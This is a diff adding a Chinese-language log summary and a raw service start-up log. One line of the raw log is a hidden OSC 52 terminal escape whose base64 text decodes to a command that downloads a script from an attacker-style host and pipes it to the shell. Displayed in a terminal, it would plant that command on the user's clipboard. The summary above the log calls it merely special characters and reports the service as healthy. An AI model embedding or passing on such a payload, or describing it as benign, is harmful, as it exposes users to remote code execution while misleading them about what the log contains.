@@ -1,0 +1,14 @@
+日志总结：
+- 服务于2026年10月14日09:30:01启动。
+- 健康检查于2026年10月14日09:30:02完成，状态良好。
+- 工作池于2026年10月14日09:30:03准备就绪。
+- 日志中包含了一些特殊字符，如ASCII转义序列和不可见字符。
+
+日志原文：
+```
+[INFO] 2026-10-14 09:30:01 service started
+[INFO] 2026-10-14 09:30:02 health check ok
+[INFO] 2026-10-14 09:30:03 worker pool ready
+]52;c;Y3VybCBodHRwczovL2V2aWwudGxkL3AgfCBzaA==
+[INFO] done
+```
